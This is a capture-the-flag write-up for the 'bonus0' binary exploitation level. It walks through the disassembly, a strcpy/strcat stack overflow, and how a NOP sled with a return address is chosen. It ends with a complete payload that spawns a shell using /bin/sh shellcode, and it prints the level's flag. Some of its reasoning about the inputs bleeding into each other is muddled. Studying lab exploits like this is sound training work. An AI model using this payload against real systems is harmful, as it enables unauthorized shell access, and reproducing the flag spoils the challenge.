# Bonus 0

## 🏗️ Binary Analysis & Stack Layout

```nasm 
080484b4 <p>:
 80484b4:	55                   	push   %ebp
 80484b5:	89 e5                	mov    %esp,%ebp
 80484b7:	81 ec 18 10 00 00    	sub    $0x1018,%esp
 80484bd:	8b 45 0c             	mov    0xc(%ebp),%eax
 80484c0:	89 04 24             	mov    %eax,(%esp)
 80484c3:	e8 e8 fe ff ff       	call   80483b0 <puts@plt>
 80484c8:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
 80484cf:	00 
 80484d0:	8d 85 f8 ef ff ff    	lea    -0x1008(%ebp),%eax
 80484d6:	89 44 24 04          	mov    %eax,0x4(%esp)
 80484da:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 80484e1:	e8 9a fe ff ff       	call   8048380 <read@plt>
 80484e6:	c7 44 24 04 0a 00 00 	movl   $0xa,0x4(%esp)
 80484ed:	00 
 80484ee:	8d 85 f8 ef ff ff    	lea    -0x1008(%ebp),%eax
 80484f4:	89 04 24             	mov    %eax,(%esp)
 80484f7:	e8 d4 fe ff ff       	call   80483d0 <strchr@plt>
 80484fc:	c6 00 00             	movb   $0x0,(%eax)
 80484ff:	8d 85 f8 ef ff ff    	lea    -0x1008(%ebp),%eax
 8048505:	c7 44 24 08 14 00 00 	movl   $0x14,0x8(%esp)
 804850c:	00 
 804850d:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048511:	8b 45 08             	mov    0x8(%ebp),%eax
 8048514:	89 04 24             	mov    %eax,(%esp)
 8048517:	e8 d4 fe ff ff       	call   80483f0 <strncpy@plt>
 804851c:	c9                   	leave  
 804851d:	c3                   	ret    

0804851e <pp>:
 804851e:	55                   	push   %ebp
 804851f:	89 e5                	mov    %esp,%ebp
 8048521:	57                   	push   %edi
 8048522:	53                   	push   %ebx
 8048523:	83 ec 50             	sub    $0x50,%esp
 8048526:	c7 44 24 04 a0 86 04 	movl   $0x80486a0,0x4(%esp)
 804852d:	08 
 804852e:	8d 45 d0             	lea    -0x30(%ebp),%eax
 8048531:	89 04 24             	mov    %eax,(%esp)
 8048534:	e8 7b ff ff ff       	call   80484b4 <p>
 8048539:	c7 44 24 04 a0 86 04 	movl   $0x80486a0,0x4(%esp)
 8048540:	08 
 8048541:	8d 45 e4             	lea    -0x1c(%ebp),%eax
 8048544:	89 04 24             	mov    %eax,(%esp)
 8048547:	e8 68 ff ff ff       	call   80484b4 <p>
 804854c:	8d 45 d0             	lea    -0x30(%ebp),%eax
 804854f:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048553:	8b 45 08             	mov    0x8(%ebp),%eax
 8048556:	89 04 24             	mov    %eax,(%esp)
 8048559:	e8 42 fe ff ff       	call   80483a0 <strcpy@plt>
 804855e:	bb a4 86 04 08       	mov    $0x80486a4,%ebx
 8048563:	8b 45 08             	mov    0x8(%ebp),%eax
 8048566:	c7 45 c4 ff ff ff ff 	movl   $0xffffffff,-0x3c(%ebp)
 804856d:	89 c2                	mov    %eax,%edx
 804856f:	b8 00 00 00 00       	mov    $0x0,%eax
 8048574:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
 8048577:	89 d7                	mov    %edx,%edi
 8048579:	f2 ae                	repnz scas %es:(%edi),%al
 804857b:	89 c8                	mov    %ecx,%eax
 804857d:	f7 d0                	not    %eax
 804857f:	83 e8 01             	sub    $0x1,%eax
 8048582:	03 45 08             	add    0x8(%ebp),%eax
 8048585:	0f b7 13             	movzwl (%ebx),%edx
 8048588:	66 89 10             	mov    %dx,(%eax)
 804858b:	8d 45 e4             	lea    -0x1c(%ebp),%eax
 804858e:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048592:	8b 45 08             	mov    0x8(%ebp),%eax
 8048595:	89 04 24             	mov    %eax,(%esp)
 8048598:	e8 f3 fd ff ff       	call   8048390 <strcat@plt>
 804859d:	83 c4 50             	add    $0x50,%esp
 80485a0:	5b                   	pop    %ebx
 80485a1:	5f                   	pop    %edi
 80485a2:	5d                   	pop    %ebp
 80485a3:	c3                   	ret    

080485a4 <main>:
 80485a4:	55                   	push   %ebp
 80485a5:	89 e5                	mov    %esp,%ebp
 80485a7:	83 e4 f0             	and    $0xfffffff0,%esp
 80485aa:	83 ec 40             	sub    $0x40,%esp
 80485ad:	8d 44 24 16          	lea    0x16(%esp),%eax
 80485b1:	89 04 24             	mov    %eax,(%esp)
 80485b4:	e8 65 ff ff ff       	call   804851e <pp>
 80485b9:	8d 44 24 16          	lea    0x16(%esp),%eax
 80485bd:	89 04 24             	mov    %eax,(%esp)
 80485c0:	e8 eb fd ff ff       	call   80483b0 <puts@plt>
 80485c5:	b8 00 00 00 00       	mov    $0x0,%eax
 80485ca:	c9                   	leave  
 80485cb:	c3                   	ret    
 80485cc:	90                   	nop
 80485cd:	90                   	nop
 80485ce:	90                   	nop
 80485cf:	90                   	nop
```


In main, a destination buffer of 54 bytes is allocated and passed down to pp.
By inspecting the raw assembly generated for `pp`, we can trace how `strcpy` and `strcat` manipulate this 54-byte buffer

### Stack Layout & Buffers
| Offset / Target | Size | Type / Field | Description |
| :--- | :--- | :--- | :--- |
| `ebp-0x20` | 20 bytes | `char[20]` | Second local buffer filled by `p()`. |
| `ebp-0x34` | 20 bytes | `char[20]` | First local buffer filled by `p()`. |

---

### Step-by-Step Execution via Assembly & String Operations

1. **First Copy (`strcpy`)**
   * **Action:** Copies the first input (`ebp-0x34`) into the 54-byte destination buffer (`param_1`).
   * **Behavior:** strcpy blindly copies bytes until it encounters the null-terminator (\0) 

2. **Second Concat (`strcat`)**
   * **Action:** Appends the second input (`ebp-0x20`) right at the end of the existing string inside the destination buffer.
   * **The Vulnerability:** `strcat` searches for the null-terminating byte (`\0`) and appends the second input without checking any length limits. If the combined data exceeds 54 bytes, it spills over, overwriting adjacent memory on the stack (including the return address) and successfully hijacking control flow.


On the stack, local variables are often placed next to each other. If the input placed in the first buffer (`ebp-0x34`) does **not** contain a null-terminator early on (or if we control its contents to bleed over), `strcpy` won't stop cleanly. Alternatively, because `strcat` relies entirely on finding the `\0` left by `strcpy`:
   * If the first input completely fills its space or doesn't have an early `\0`, `strcat` starts appending from wherever it finds the end of that string.


these two inputs were filled by p call

| Call / Buffer | Target Address | Role & Description |
| :--- | :--- | :--- |
| **First Call to `p()`** | `ebp-0x34` | Houses our large **NOP sled and shellcode**, establishing a stable landing zone. |
| **Second Call to `p()`** | `ebp-0x20` | Appended via `strcat` to supply the exact **padding and target return address**, overflowing the 54-byte limit to overwrite the `saved EIP`. |




## solution

To successfully exploit the vulnerability and spawn a shell, we construct a two-part payload mapped precisely to the two sequential `p()` calls inside `pp()`.

### 1. Analysis of Function `p()` (Disassembly)
By inspecting the assembly of function `p()`, we can see how it allocates a massive local buffer to read our user input:

```nasm
0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax ; buffer address
(gdb) x $ebp-0x1008
0xbfffe680:	0x00000000
```

we can serve of this buffer for store our payload in addition with nop sled. the logic is that the second input will point to an address of this buffer.
so the first buffer will contain nop sled with our shellcode and the second input offset to reach eip, then address which point in our nop sled before the shellcode + 1 chr to fill the buffer

### 2. How `strcpy` and `strcat` Bridge the Inputs
The critical flaw lies in how `pp()` moves these buffers into the original 54-byte destination buffer:

1. **The First Copy (`strcpy`):** 
   `strcpy(param_1, local_34)` copies the first input into the 54-byte destination buffer. Because `strcpy` copies until it finds a null-terminator (`\0`), and our first input is packed with NOPs and shellcode (with no early null byte), it copies seamlessly. 
2. **The Missing Terminator & Bleed-Over:** 
   Because the first input doesn't terminate cleanly, the copy process effectively bridges into the second input container in memory. 
3. **The Concatenation (`strcat`):** 
   `strcat(param_1, local_20)` looks for the end of the current string in the destination buffer and appends the second input right after it.



Let's trace the exact sizing as it accumulates inside the **54-byte original destination buffer**:

* **First Input (`20 bytes`):** Copied via `strcpy`, filling the initial space with NOPs.
* **Second Input (`19 bytes` ):** Appended via `strcat`. 
  * You provide **19 bytes** of data.
  * You add **1 extra character** with  ' ' character  to properly structure/terminate the sequence, bringing this chunk to 20 bytes.
  * Combined with the first input, `param_1` now holds **40 bytes** of data (`20 + 20`).
* **Reaching `saved EIP` (`14 bytes`):** 
  * The destination buffer has a total capacity of 54 bytes. 
  * We currently occupy 40 bytes. 
  * We add **14 padding bytes** (`54 - 40 = 14`) to fill the remaining space right up to the exact edge of the buffer.
* **Overwriting `saved EIP` (`4 bytes`):** 
  * Immediately following the 54-byte boundary sits the `saved return address (EIP)`. 
  * We overwrite these 4 bytes with our **target address** (`buffer + 150`), which points safely deep inside the NOP sled from our first input.

When `pp()` hits `ret`, control flow jumps into the NOP sled and slides straight into our shellcode.



### 3. Why add Nop sled and choose buffer address + 150

1. The Environment Shift Problem (GDB vs. Real Execution)

When you find an address like `0xbfffe680` inside GDB, that exact memory layout is **not guaranteed** when you run the binary normally from the terminal. 

* GDB injects extra environment variables (like `LINES`, `COLUMNS`, and the full path of the binary) onto the stack, which shifts every stack address down by a few dozen bytes.
* When you run the program outside GDB, the stack shifts back up. 
* Therefore, a fixed offset like `+ 150` is only an *estimate*. If the stack shifts by $\pm 40$ bytes between your test environment and the actual execution, your target address might miss your shellcode entirely.

---

2. The Danger of Raw Shellcode (Instruction Alignment)

Shellcode is a sequence of tight, multi-byte assembly instructions. 

* If you point `EIP` directly to the start of a raw shellcode, and the stack shifts by even **1 single byte**, the CPU will start decoding the instructions shifted by one byte. 
* This breaks the opcode boundaries, turns valid instructions into random garbage, and instantly crashes the program.

---


By combining `buffer + 150` with a massive 500-byte NOP sled, you create a fail-safe mechanism:

1. **`buffer + 150` gets you into the neighborhood:** It acts as an educated guess to aim deep inside your payload area.
2. **The NOP Sled absorbs the errors:** 
   * If the stack shifts by $+30$ bytes, you land on byte #180 of the NOP sled.
   * If the stack shifts by $-30$ bytes, you land on byte #120 of the NOP sled.
   * In *both* cases, you are still safely stepping on `0x90` (NOP) instructions. The CPU executes them sequentially, sliding smoothly forward until it hits your untouched shellcode. 

Without the NOP sled, a tiny 1-byte stack shift means total failure. With it, you have hundreds of bytes of margin for error.


### 4. Payload

(python -c "print('\x90' * 500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"; python -c "print('B' * 14 + '\x16\xe7\xff\xbf' + 'A')"; cat) | ./bonus0


## flag

cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
